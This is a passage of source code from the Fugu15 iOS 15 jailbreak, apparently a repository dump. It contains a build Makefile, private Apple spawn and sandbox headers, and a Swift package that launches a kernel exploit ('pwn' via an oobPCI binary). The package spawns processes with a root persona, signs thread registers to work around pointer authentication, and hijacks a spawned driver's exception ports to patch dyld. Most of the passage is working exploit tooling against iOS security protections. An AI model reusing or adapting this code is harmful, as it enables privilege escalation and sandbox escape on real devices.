    var attr: posix_spawnattr_t?
    posix_spawnattr_init(&attr)
    posix_spawnattr_set_persona_np(&attr, 99, 1)
    posix_spawnattr_set_persona_uid_np(&attr, 0)
    posix_spawnattr_set_persona_gid_np(&attr, 0)
    
    var pid: pid_t = 0
    var argv: [UnsafeMutablePointer<CChar>?] = []
    for arg in args {
        argv.append(strdup(arg))
    }
    
    argv.append(nil)
    
    let result = posix_spawn(&pid, argv[0], &fileActions, &attr, &argv, environ)
    let err = errno
    guard result == 0 else {
        NSLog("Failed")
        NSLog("Error: \(result) Errno: \(err)")
        
        return nil
    }
    
    var status: Int32 = 0
    waitpid(pid, &status, 0)
    
    return status
}

if CommandLine.arguments.count > 1 {
    switch CommandLine.arguments[1] {
    case "fixAppPerm":
        guard CommandLine.arguments.count == 4 else {
            exit(-1)
        }
        
        let installed = URL(fileURLWithPath: CommandLine.arguments[3])
        let orig = URL(fileURLWithPath: CommandLine.arguments[2]).appendingPathComponent("Payload").appendingPathComponent(installed.lastPathComponent)
        
        do {
            if let enumerator = FileManager.default.enumerator(atPath: orig.path) {
                for case let file as String in enumerator {
                    let origPath = orig.path + "/" + file
                    let newPath  = installed.path + "/" + file
                    if let attr = try? FileManager.default.attributesOfItem(atPath: origPath) {
                        if let perms = attr[.posixPermissions] {
                            try FileManager.default.setAttributes([.posixPermissions: perms], ofItemAtPath: newPath)
                        }
                    }
                }
            }
        } catch {
            exit(-2)
        }
        
        exit(0)
        
    default:
        exit(-1)
    }
}

FuguInstallApp.main()

```

`LICENSE`:

```
MIT License

Copyright (c) 2022 Pinauten GmbH

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

```

`Makefile`:

```
ipa: all
	@echo Building Fugu15_Developer.ipa
	python3 Server/buildIPA.py Fugu15/Fugu15.ipa Fugu15_Developer.ipa

all %:
	@xattr -rc Tools >/dev/null 2>&1
	$(MAKE) -C Exploits/oobPCI $@
	$(MAKE) -C Fugu15 $@
	$(MAKE) -C FuguInstall $@

```

`Packages/Fugu15KernelExploit/Package.swift`:

```swift
// swift-tools-version:5.4
// The swift-tools-version declares the minimum version of Swift required to build this package.

import PackageDescription

let package = Package(
    name: "Fugu15KernelExploit",
    platforms: [
        .iOS(.v14),
        .macOS(.v11)
    ],
    products: [
        // Products define the executables and libraries a package produces, and make them visible to other packages.
        .library(
            name: "Fugu15KernelExploit",
            targets: ["Fugu15KernelExploit"])
    ],
    dependencies: [
        .package(url: "https://github.com/pinauten/SwiftUtils", .branch("master")),
        .package(path: "../ProcessCommunication"),
        .package(url: "https://github.com/pinauten/PatchfinderUtils", .branch("master")),
        .package(url: "https://github.com/pinauten/KernelPatchfinder", .branch("master")),
        .package(url: "https://github.com/pinauten/iDownload", .branch("master")),
    ],
    targets: [
        // Targets are the basic building blocks of a package. A target can define a module or a test suite.
        // Targets can depend on other targets in this package, and on products in packages this package depends on.
        .target(name: "CBindings"),
        .target(
            name: "Fugu15KernelExploit",
            dependencies: ["CBindings", "SwiftUtils", "ProcessCommunication", "PatchfinderUtils", "KernelPatchfinder", "iDownload"]),
    ]
)

```

`Packages/Fugu15KernelExploit/README.md`:

```md
# Fugu15KernelExploit

This package can be used to easily launch the Fugu15 kernel exploit and use it's capabilities.

```

`Packages/Fugu15KernelExploit/Sources/CBindings/include/CBindings.h`:

```h
//
//  CBindings.h
//  kexploitd
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#ifndef CBindings_h
#define CBindings_h

#include <spawn.h>

#include "posix_spawn.h"
#include "th_state.h"



#endif /* CBindings_h */

```

`Packages/Fugu15KernelExploit/Sources/CBindings/include/posix_spawn.h`:

```h
/*
 * Copyright (c) 2006, 2008 Apple,Inc. All rights reserved.
 *
 * @APPLE_LICENSE_HEADER_START@
 *
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this
 * file.
 *
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 *
 * @APPLE_LICENSE_HEADER_END@
 */

#ifndef _SPAWN_PRIVATE_H_
#define _SPAWN_PRIVATE_H_

#include <spawn.h>
#include <sys/cdefs.h>
#include <sys/types.h>
#include <Availability.h>
#include <TargetConditionals.h>

#undef __API_AVAILABLE
#define __API_AVAILABLE(...)

__BEGIN_DECLS

int     posix_spawnattr_getpcontrol_np(const posix_spawnattr_t * __restrict, int * __restrict) __API_AVAILABLE(macos(10.6), ios(3.2));
int     posix_spawnattr_setpcontrol_np(posix_spawnattr_t *, const int) __API_AVAILABLE(macos(10.6), ios(3.2));

int     posix_spawnattr_getprocesstype_np(const posix_spawnattr_t * __restrict, int * __restrict) __API_AVAILABLE(macos(10.8), ios(6.0));
int     posix_spawnattr_setprocesstype_np(posix_spawnattr_t *, const int) __API_AVAILABLE(macos(10.8), ios(6.0));

int     posix_spawnattr_setcpumonitor(posix_spawnattr_t * __restrict, uint64_t, uint64_t) __API_AVAILABLE(macos(10.8), ios(6.0));
int     posix_spawnattr_getcpumonitor(posix_spawnattr_t * __restrict, uint64_t *, uint64_t *) __API_AVAILABLE(macos(10.8), ios(6.0));
int     posix_spawnattr_setcpumonitor_default(posix_spawnattr_t * __restrict) __API_AVAILABLE(macos(10.9), ios(6.0));

#if (TARGET_OS_IPHONE && !TARGET_OS_SIMULATOR)
int     posix_spawnattr_setjetsam(posix_spawnattr_t * __restrict attr,
    short flags, int priority, int memlimit) __API_UNAVAILABLE(macos) __API_AVAILABLE(ios(5.0));
#endif /* (TARGET_OS_IPHONE && !TARGET_OS_SIMULATOR) */

int     posix_spawnattr_setjetsam_ext(posix_spawnattr_t * __restrict attr,
    short flags, int priority, int memlimit_active, int memlimit_inactive) __API_AVAILABLE(macos(10.11), ios(9.0));

// time-to-relaunch after jetsam, set by launchd
int     posix_spawnattr_set_jetsam_ttr_np(const posix_spawnattr_t * __restrict attr, uint32_t count, uint32_t *ttrs_millis) __OSX_AVAILABLE_STARTING(__MAC_10_15, __IPHONE_13_0);

int     posix_spawnattr_set_threadlimit_ext(posix_spawnattr_t * __restrict attr,
    int thread_limit)  __API_AVAILABLE(macos(10.14), ios(12.0), tvos(12.0), watchos(5.0));

#define POSIX_SPAWN_IMPORTANCE_PORT_COUNT 32
int     posix_spawnattr_set_importancewatch_port_np(posix_spawnattr_t * __restrict attr,
    int count, mach_port_t portarray[])  __API_AVAILABLE(macos(10.9), ios(6.0));

int     posix_spawnattr_set_registered_ports_np(posix_spawnattr_t * __restrict attr, mach_port_t portarray[], uint32_t count) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));

int
posix_spawnattr_set_ptrauth_task_port_np(posix_spawnattr_t * __restrict attr,
    mach_port_t port) __API_AVAILABLE(macos(10.16), ios(14.0), tvos(14.0), watchos(7.0));

#define POSIX_SPAWN_MACPOLICYINFO_WITHSIZE 1
int     posix_spawnattr_getmacpolicyinfo_np(const posix_spawnattr_t * __restrict, const char *, void **, size_t *) __API_AVAILABLE(macos(10.9), ios(7.0));
int     posix_spawnattr_setmacpolicyinfo_np(posix_spawnattr_t * __restrict, const char *, void *, size_t) __API_AVAILABLE(macos(10.9), ios(7.0));

int     posix_spawnattr_setcoalition_np(const posix_spawnattr_t * __restrict, uint64_t, int, int) __API_AVAILABLE(macos(10.10), ios(8.0));

int     posix_spawnattr_set_qos_clamp_np(const posix_spawnattr_t * __restrict, uint64_t) __API_AVAILABLE(macos(10.10), ios(8.0));
int     posix_spawnattr_get_qos_clamp_np(const posix_spawnattr_t * __restrict, uint64_t * __restrict) __API_AVAILABLE(macos(10.10), ios(8.0));

int     posix_spawnattr_set_darwin_role_np(const posix_spawnattr_t * __restrict, uint64_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_get_darwin_role_np(const posix_spawnattr_t * __restrict, uint64_t * __restrict) __API_AVAILABLE(macos(10.11), ios(9.0));

int     posix_spawnattr_set_persona_np(const posix_spawnattr_t * __restrict, uid_t, uint32_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_uid_np(const posix_spawnattr_t * __restrict, uid_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_gid_np(const posix_spawnattr_t * __restrict, gid_t) __API_AVAILABLE(macos(10.11), ios(9.0));
int     posix_spawnattr_set_persona_groups_np(const posix_spawnattr_t * __restrict, int, gid_t * __restrict, uid_t) __API_AVAILABLE(macos(10.11), ios(9.0));

int     posix_spawnattr_set_max_addr_np(const posix_spawnattr_t * __restrict attr, uint64_t max_addr) __API_AVAILABLE(macos(10.14), ios(12.0), tvos(12.0), watchos(5.0));

int     posix_spawnattr_set_uid_np(const posix_spawnattr_t * __restrict, uid_t) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));
int     posix_spawnattr_set_gid_np(const posix_spawnattr_t * __restrict, gid_t) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));
int     posix_spawnattr_set_groups_np(const posix_spawnattr_t * __restrict, int, gid_t * __restrict, uid_t) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));
int     posix_spawnattr_set_login_np(const posix_spawnattr_t * __restrict, const char * __restrict) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));

int     posix_spawnattr_set_subsystem_root_path_np(posix_spawnattr_t *attr, char *path); __API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0));

int     posix_spawnattr_set_platform_np(posix_spawnattr_t *attr, int platform, uint32_t flags); __API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0));

int     posix_spawnattr_disable_ptr_auth_a_keys_np(posix_spawnattr_t *attr, uint32_t flags); __API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0));

int     posix_spawn_file_actions_add_fileportdup2_np(posix_spawn_file_actions_t * __restrict, mach_port_t, int) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));

struct sandbox_spawnattrs {
    uint8_t unk[8192];
};

void sandbox_spawnattrs_init(struct sandbox_spawnattrs *attrs);
int sandbox_spawnattrs_setprofilename(struct sandbox_spawnattrs *attrs, const char *);
int sandbox_spawnattrs_setcontainer(struct sandbox_spawnattrs *attrs, const char *);
int sandbox_init(const char *profile, uint64_t flags, char **errorbuf);

void* sandbox_create_params();
int sandbox_set_param(void* params, const char* key, const char* value);
void* sandbox_compile_string(const char* profile_str,
                             void* params,
                             char** error);
int sandbox_apply(void* profile);
void sandbox_free_params(void* params);
void sandbox_free_profile(void* profile);

struct sandbox_policy_layout {
    void *profile;
    uint64_t len;
    void *container;
    uint64_t containerLen;
    uint64_t pad1;
    uint64_t pad2;
};

int __sandbox_ms(const char* policy, int call, struct sandbox_policy_layout* arg);

__END_DECLS

#endif /* !defined _SPAWN_PRIVATE_H_*/

```

`Packages/Fugu15KernelExploit/Sources/CBindings/include/th_state.h`:

```h
/*
 * Copyright (c) 2006, 2008 Apple,Inc. All rights reserved.
 *
 * @APPLE_LICENSE_HEADER_START@
 *
 * This file contains Original Code and/or Modifications of Original Code
 * as defined in and that are subject to the Apple Public Source License
 * Version 2.0 (the 'License'). You may not use this file except in
 * compliance with the License. Please obtain a copy of the License at
 * http://www.opensource.apple.com/apsl/ and read it before using this
 * file.
 *
 * The Original Code and all software distributed under the License are
 * distributed on an 'AS IS' basis, WITHOUT WARRANTY OF ANY KIND, EITHER
 * EXPRESS OR IMPLIED, AND APPLE HEREBY DISCLAIMS ALL SUCH WARRANTIES,
 * INCLUDING WITHOUT LIMITATION, ANY WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE, QUIET ENJOYMENT OR NON-INFRINGEMENT.
 * Please see the License for the specific language governing rights and
 * limitations under the License.
 *
 * @APPLE_LICENSE_HEADER_END@
 */

#ifndef TH_STATE_H_
#define TH_STATE_H_

#include <stdint.h>
#include <mach/mach.h>

#ifdef __arm64__

uint64_t thread_state64_get_pc(const arm_thread_state64_t *ts);
void thread_state64_set_pc(arm_thread_state64_t *ts, uint64_t pc);
uint64_t thread_state64_get_lr(const arm_thread_state64_t *ts);
void thread_state64_set_lr(arm_thread_state64_t *ts, uint64_t lr);

#endif /* defined __arm64__ */

struct exception_message_reply {
    mach_msg_header_t hdr;
    NDR_record_t NDR;
    kern_return_t result;
};

#endif /* !defined TH_STATE_H_ */

```

`Packages/Fugu15KernelExploit/Sources/CBindings/th_state.c`:

```c
//
//  th_state.h
//  kexploitd
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

#include <stdint.h>
#include <mach/mach.h>

#ifdef __arm64__

#include <ptrauth.h>

uint64_t thread_state64_get_pc(const arm_thread_state64_t *ts) {
    return arm_thread_state64_get_pc(*ts);
}

void thread_state64_set_pc(arm_thread_state64_t *ts, uint64_t pc) {
    void *ptr = ptrauth_sign_unauthenticated((void*)pc, ptrauth_key_function_pointer, 0);
    arm_thread_state64_set_pc_fptr(*ts, ptr);
}

uint64_t thread_state64_get_lr(const arm_thread_state64_t *ts) {
    return arm_thread_state64_get_lr(*ts);
}

void thread_state64_set_lr(arm_thread_state64_t *ts, uint64_t lr) {
    void *ptr = ptrauth_sign_unauthenticated((void*)lr, ptrauth_key_function_pointer, 0);
    arm_thread_state64_set_lr_fptr(*ts, ptr);
}

#endif /* defined __arm64__ */

```

`Packages/Fugu15KernelExploit/Sources/Fugu15KernelExploit/Fugu15.swift`:

```swift
//
//  Fugu15.swift
//  Fugu15KernelExploit
//
//  Created by Linus Henze.
//

import Foundation
import ProcessCommunication
import CBindings
import KernelPatchfinder

public enum Fugu15LaunchError: Error {
    case deviceNotSupported(reason: String)
    case posix_spawnFailed(result: Int32, errno: Int32)
    case noPongReceived
    case kexploitdFailed
    case canOnlyLaunchiDownloadAfterExploitRan
    case iDownloadLaunchFailed(reply: [String])
}

public enum Fugu15SupportsThisDevice {
    case yes
    case no(reason: String)
}

public struct Fugu15 {
    public static var comm: ProcessCommunication?
    public static var patchfinder = KernelPatchfinder.running
    
    static var kernelBase: UInt64 = 0
    static var kernelSlide: UInt64 = 0
    
    // Lock for requests to pciPwn
    static let requestLock     = NSLock()

    // Lock to notify exception handler to continue
    static let sendRequestLock = NSLock()

    // Lock to notify requestor to continue
    static let replyLock       = NSLock()

    // Request
    static var request:        UInt64 = 0
    static var requestAddrPid: UInt64 = 0
    static var requestSize:    UInt64 = 0
    static var requestBuf:     Data?

    // Reply
    static var replyStatus: UInt64 = 0
    static var replyResult: UInt64 = 0
    static var replyBuf:    Data?
    
    public static func supportsThisDevice() -> Fugu15SupportsThisDevice {
        // Test iOS version
        let osVersion = ProcessInfo.processInfo.operatingSystemVersion
        guard osVersion.majorVersion == 15,
              osVersion.minorVersion < 5 else {
            return .no(reason: "Fugu15 only supports iOS 15 - 15.4.1!")
        }
        
        // The exploits should support some 15.5 betas
        // Not implemented though
        /*if osVersion.minorVersion == 5 {
            var size = 1024
            let ptr  = UnsafeMutablePointer<UInt8>.allocate(capacity: size + 1)
            defer { ptr.deallocate() }
            
            let res = sysctlbyname("kern.osversion", ptr, &size, nil, 0)
            guard res == 0 else {
                return .no(reason: "Fugu15 failed to determine your OS version!")
            }
            
            ptr[size] = 0 // Ensure that the string is terminated
            
            let vStr = String(cString: ptr)
            
            let supported = ["19A5261w", "19A5281h", "19A5281j", "19A5297e"] // No idea if this is correct
            guard supported.contains(vStr) else {
                return .no(reason: "Fugu15 only supports iOS 15 - 15.4.1 (and some 15.5 betas)!")
            }
        }*/
        
        // Ensure device supports pointer authentication
        guard deviceSupports(cpuFeature: "PAuth") else {
            return .no(reason: "Fugu15 only supports PAC devices (iPhone XS and newer)!")
        }
        
        return .yes
    }
    
    public static func querySysctlBool(name: String) -> Bool {
        var size = 8
        let ptr  = UnsafeMutablePointer<UInt8>.allocate(capacity: size)
        defer { ptr.deallocate() }
        
        let res = sysctlbyname(name, ptr, &size, nil, 0)
        guard res == 0 else {
            return false
        }
        
        return ptr[0] != 0
    }
    
    public static func deviceSupports(cpuFeature: String) -> Bool {
        return querySysctlBool(name: "hw.optional.arm.FEAT_\(cpuFeature)")
    }
    
    /**
     * Launch kernel exploit. Requires path to oobPCI.
     *
     * - Parameter oobPCI: Path to the oobPCI executable
     * - Parameter logger: A function to log messages
     *
     * - Warning: This function blocks, do not call it on the main dispatch queue
     */
    public static func launchKernelExploit(oobPCI: URL, logger: @escaping (_ msg: String) -> Void) throws {
        switch supportsThisDevice() {
        case .yes:
            break
            
        case .no(reason: let reason):
            throw Fugu15LaunchError.deviceNotSupported(reason: reason)
        }
        
        // Create pipes to use for communication
        // We use control and log pipes
        let controlToChild = Pipe()
        let controlFromChild = Pipe()
        let logFromChild = Pipe()
        
        // We're entitled to do that ;)
        var attr: posix_spawnattr_t?
        posix_spawnattr_init(&attr)
        posix_spawnattr_set_persona_np(&attr, 99, 1)
        posix_spawnattr_set_persona_uid_np(&attr, 0)
        posix_spawnattr_set_persona_gid_np(&attr, 0)
        
        // Close unnecessary handles
        var fileActions: posix_spawn_file_actions_t?
        posix_spawn_file_actions_init(&fileActions)
        posix_spawn_file_actions_addclose(&fileActions, controlToChild.fileHandleForWriting.fileDescriptor)
        posix_spawn_file_actions_addclose(&fileActions, controlFromChild.fileHandleForReading.fileDescriptor)
        posix_spawn_file_actions_addclose(&fileActions, logFromChild.fileHandleForReading.fileDescriptor)
        
        var pid: pid_t = 0
        var argv: [UnsafeMutablePointer<CChar>?] = [
            strdup(CommandLine.arguments[0]),
            strdup("Fugu15_server"),
            strdup("\(controlToChild.fileHandleForReading.fileDescriptor)"),
            strdup("\(controlFromChild.fileHandleForWriting.fileDescriptor)"),
            strdup("\(logFromChild.fileHandleForWriting.fileDescriptor)"),
            nil
        ]
        
        defer {
            for arg in argv {
                free(arg)
            }
        }
        
        let result = posix_spawn(&pid, argv[0], &fileActions, &attr, &argv, environ)
        let err = errno
        guard result == 0 else {
            throw Fugu15LaunchError.posix_spawnFailed(result: result, errno: err)
        }
        
        try? controlToChild.fileHandleForReading.close()
        try? controlFromChild.fileHandleForWriting.close()
        try? logFromChild.fileHandleForWriting.close()
        
        DispatchQueue(label: "Fugu15-Logging").async {
            var buf = ""
            while true {
                do {
                    let data = try logFromChild.fileHandleForReading.read(upToCount: 1)
                    if data == nil || data?.count == 0 {
                        return
                    }
                    
                    if data.unsafelyUnwrapped[0] == 0xA /* newline */ {
                        logger(buf)
                        buf = ""
                    } else {
                        buf += String(data: data.unsafelyUnwrapped, encoding: .utf8) ?? ""
                    }
                } catch _ {
                    return
                }
            }
        }
        
        // Send ping
        let comm = ProcessCommunication(read: controlFromChild.fileHandleForReading, write: controlToChild.fileHandleForWriting)
        comm.sendCommand("ping")
        
        guard comm.receiveCommand() == ["pong"] else {
            throw Fugu15LaunchError.noPongReceived
        }
        
        comm.sendCommand("pwn", oobPCI.path)
        
        if comm.receiveCommand() != ["ok"] {
            throw Fugu15LaunchError.kexploitdFailed
        }
        
        comm.sendCommand("waitUntilDone")
        if comm.receiveCommand() != ["done"] {
            throw Fugu15LaunchError.kexploitdFailed
        }
        
        Self.comm = comm
    }
    
    public static func launch_iDownload() throws {
        guard let comm = Self.comm else {
            throw Fugu15LaunchError.canOnlyLaunchiDownloadAfterExploitRan
        }
        
        comm.sendCommand("launch_iDownload")
        let reply = comm.receiveCommand()
        if reply != ["done"] {
            throw Fugu15LaunchError.iDownloadLaunchFailed(reply: reply ?? [])
        }
    }
    
    /**
     * Call this method from your main function. Only returns if invoked without a Fugu15 command.
     */
    public static func mainHook() {
        if CommandLine.arguments.count > 1 {
            switch CommandLine.arguments[1] {
            case "Fugu15_server":
                let logOut = FileHandle(fileDescriptor: Int32(CommandLine.arguments[4])!, closeOnDealloc: true)
                Logger.logFileHandle = logOut
                
                guard let checkin = getDKCheckinData() else {
                    execv(Bundle.main.executablePath, CommandLine.unsafeArgv)
                    Logger.print("Failed to re-exec myself after failing DK checkin!")
                    fatalError("Failed to re-exec myself after failing DK checkin!")
                }
                
                serverMain(checkin: checkin)
            
            default:
                break
            }
        }
    }
}

```

`Packages/Fugu15KernelExploit/Sources/Fugu15KernelExploit/Logger.swift`:

```swift
//
//  Logger.swift
//  kexploitd
//
//  Created by Linus Henze.
//  Copyright © 2021/2022 Pinauten GmbH. All rights reserved.
//

import Foundation

class Logger {
    static var logFileHandle: FileHandle?
    
    static func print(_ s: String) {
        NSLog("%@", s)
        
        if logFileHandle != nil {
            try? logFileHandle.unsafelyUnwrapped.write(contentsOf: (s + "\n").data(using: .utf8) ?? Data())
        }
    }
    
    static func fmt(_ s: String, _ args: CVarArg...) {
        print(String(format: s, arguments: args))
    }
    
    static func status(_ s: String) {
        print("Status: \(s)")
    }
}

```

`Packages/Fugu15KernelExploit/Sources/Fugu15KernelExploit/SpawnDrv/SpawnDrv.swift`:

```swift
//
//  SpawnDrv.swift
//  Fugu15KernelExploit/SpawnDrv
//
//  Created by Linus Henze.
//  Copyright © 2022 Pinauten GmbH. All rights reserved.
//

import Foundation
import Darwin
import SwiftUtils
import CBindings
import MachO
import SwiftMachO
import PatchfinderUtils
import KernelPatchfinder

let POSIX_SPAWN_PROC_TYPE_DRIVER: Int32 = 0x700

let BP_ENABLED: UInt64 = 1
let BP_USER:    UInt64 = 0b10   << 1
let BP_BAS:     UInt64 = 0b0011 << 5

enum SpawnDriverError: Error {
    case failedToOpenDriver
    case notADriver
    case posix_spawnattr_initFailed
    case posix_spawnFailed(error: Int32, string: String)
    case task_for_pidFailed
    case mach_port_allocateFailed
    case mach_port_insert_rightFailed
    case task_set_exception_portsFailed
}

typealias SpawnDrvExceptionHandler = (_: SpawnDrv, _: Task, _: Thread, _: inout arm_thread_state64_t) -> kern_return_t
typealias SpawnDrvExitHandler = (_: SpawnDrv, _: Int32) -> Void

class SpawnDrv {
    public let executable: URL
    
    public private(set) var pid: pid_t = 0
    public private(set) var child: Task!
    
    private var curPlat:  UInt64 = 0
    private var getEntry: UInt64 = 0
    private var curPlatReg: UInt8 = 0
    private var base: UInt64 = 0
    
    private var exitHandler: SpawnDrvExitHandler?
    
    public init(executable: URL) {
        self.executable = executable
    }
    
    public func onExit(_ hndlr: @escaping SpawnDrvExitHandler) {
        exitHandler = hndlr
    }
    
    public func launch(arguments: [String], checkinData: DKCheckinData, exceptionHandler: @escaping SpawnDrvExceptionHandler) throws {
        var killChild = false
        defer {
            if killChild {
                kill(pid, SIGKILL)
            }
        }
        
        // Verify "driver"
        var entryPoint: UInt64!
        do {
            let drvMachO = try MachO(fromFile: executable.path)
            
            for lc in drvMachO.cmds {
                if case .Unknown(0x13371337) = lc.type,
                   (lc.cmdSize + 8) >= MemoryLayout<entry_point_command>.size {
                    // This is the LC_MAIN command
                    let ep = lc as! OpaqueLoadCommand
                    let epData = Data(repeating: 0, count: 8) + ep.data
                    entryPoint = epData.withUnsafeBytes { (ptr: UnsafeRawBufferPointer) in
                        ptr.baseAddress!.assumingMemoryBound(to: entry_point_command.self).pointee.entryoff
                    }
                    
                    break
                }
            }
        } catch {
            throw SpawnDriverError.failedToOpenDriver
        }

        if entryPoint == nil {
            throw SpawnDriverError.notADriver
        }

        var attr: posix_spawnattr_t?

        guard posix_spawnattr_init(&attr) == 0 else {
            throw SpawnDriverError.posix_spawnattr_initFailed
        }

        posix_spawnattr_setprocesstype_np(&attr, POSIX_SPAWN_PROC_TYPE_DRIVER)

        // Drivers must be sandboxed -> Use a built-in sandbox
        // It shouldn't be too restrictive
        var sbattr = sandbox_spawnattrs()
        sandbox_spawnattrs_init(&sbattr)
        sandbox_spawnattrs_setprofilename(&sbattr, "debugserver")
        posix_spawnattr_setmacpolicyinfo_np(&attr, "Sandbox", &sbattr, 1104)

        posix_spawnattr_setflags(&attr, Int16(POSIX_SPAWN_START_SUSPENDED))
        
        // Clone our logging pipe to stdout/stderr
        var fileActions: posix_spawn_file_actions_t?
        posix_spawn_file_actions_init(&fileActions)
        if let log = Logger.logFileHandle {
            posix_spawn_file_actions_adddup2(&fileActions, log.fileDescriptor, STDOUT_FILENO)
            posix_spawn_file_actions_adddup2(&fileActions, log.fileDescriptor, STDERR_FILENO)
        }

        var cArgs: [UnsafeMutablePointer<CChar>?] = [strdup(executable.path)]
        for arg in arguments {
            cArgs.append(strdup(arg))
        }
        
        cArgs.append(nil)
        
        defer {
            for cArg in cArgs {
                free(cArg)
            }
        }
        
        guard posix_spawnp(&pid, executable.path, &fileActions, &attr, cArgs, environ) == 0 else {
            let err = errno
            throw SpawnDriverError.posix_spawnFailed(error: err, string: String(cString: strerror(err)))
        }
        
        // Force child to be killed if anything unexpected happens now
        killChild = true

        guard let child = Task.forPID(pid) else {
            throw SpawnDriverError.task_for_pidFailed
        }
        
        self.child = child

        // Need to set breakpoints and patch some stuff
        // Get current state first
        let th = child.threads[0]

        try setupDYLDPatch()

        Logger.print("[SpawnDrv] Patches set-up")

        // Make sure we are the exception server
        var excPort: mach_port_t = 0
        guard mach_port_allocate(mach_task_self_, MACH_PORT_RIGHT_RECEIVE, &excPort) == KERN_SUCCESS else {
            throw SpawnDriverError.mach_port_allocateFailed
        }

        guard mach_port_insert_right(mach_task_self_, excPort, excPort, mach_msg_type_name_t(MACH_MSG_TYPE_MAKE_SEND)) == KERN_SUCCESS else {
            throw SpawnDriverError.mach_port_insert_rightFailed
        }

        guard task_set_exception_ports(child.tp, exception_mask_t(EXC_MASK_BREAKPOINT | EXC_MASK_BAD_ACCESS), excPort, EXCEPTION_DEFAULT, 0) == KERN_SUCCESS else {
            throw SpawnDriverError.task_set_exception_portsFailed
        }

        Logger.print("[SpawnDrv] Resuming!")

        kill(pid, SIGCONT)

        DispatchQueue.init(label: "Fugu15_ExceptionServer").async {
            let buffer = malloc(1024)!
            while true {
                let hdr = buffer.assumingMemoryBound(to: mach_msg_header_t.self)
                hdr.pointee.msgh_local_port = excPort
                hdr.pointee.msgh_size = 1024
                
                guard mach_msg_receive(hdr) == KERN_SUCCESS else {
                    Logger.print("[SpawnDrv] Failed to receive exception message!")
                    kill(self.pid, SIGKILL)
                    return
                }
                
                Logger.print("[SpawnDrv] Received exception message!")
                
                var kr: kern_return_t = 0
                do {
                    kr = try self.handleException(thread: th, entryPoint: entryPoint, checkinData: checkinData, exceptionHandler: exceptionHandler)
                } catch let e {
                    Logger.print("[SpawnDrv] Exception while handling exception: \(e)")
                    kill(self.pid, SIGKILL)
                    return
                }
                
                let reply = buffer.assumingMemoryBound(to: exception_message_reply.self)
                
                // Send reply
                reply.pointee.hdr.msgh_bits          = mach_msg_bits_t(MACH_MSG_TYPE_MOVE_SEND_ONCE)
                reply.pointee.hdr.msgh_size          = 36
                reply.pointee.hdr.msgh_local_port    = 0
                reply.pointee.hdr.msgh_voucher_port  = 0
                reply.pointee.hdr.msgh_id           += 100
                
                reply.pointee.NDR = NDR_record
                
                reply.pointee.result = kr
                
                guard mach_msg_send(hdr) == KERN_SUCCESS else {
                    Logger.print("[SpawnDrv] Failed to send exception message reply!")
                    kill(self.pid, SIGKILL)
                    return
                }
                
                if kr != KERN_SUCCESS {
                    Logger.print("[SpawnDrv] Exception handler failed!")
                    kill(self.pid, SIGKILL)
                    return
                }
            }
        }
        
        DispatchQueue.init(label: "Fugu15_ExitHandler").async {
            var status: Int32 = 0
            waitpid(self.pid, &status, 0)
            
            self.exitHandler?(self, status)
        }
        
        // Child should continue to live after we return
        killChild = false
    }
    
    private func setupDYLDPatch() throws {
        let th = child.threads[0]
        
        guard let dyld = try? MachO(fromFile: "/usr/lib/dyld") else {
            throw DyldPatchSetupError.failedToOpenDyld
        }
        
        var entry: UInt64!
        for cmd in dyld.cmds {
            if let uCmd = cmd as? UnixThreadLoadCommand {
                guard let state = uCmd.threadStates[0].state.tryGetGeneric(type: arm_thread_state64_t.self) else {
                    throw DyldPatchSetupError.badDyldThreadState
                }
                
                #if arch(arm64) && __DARWIN_OPAQUE_ARM_THREAD_STATE64
                entry = UInt64(UInt(bitPattern: state.__opaque_pc))
                #else
                entry = state.__pc
                #endif
                break
            }
        }
        
        guard let entry = entry else {
            throw DyldPatchSetupError.noDyldEntryPoint
        }
        
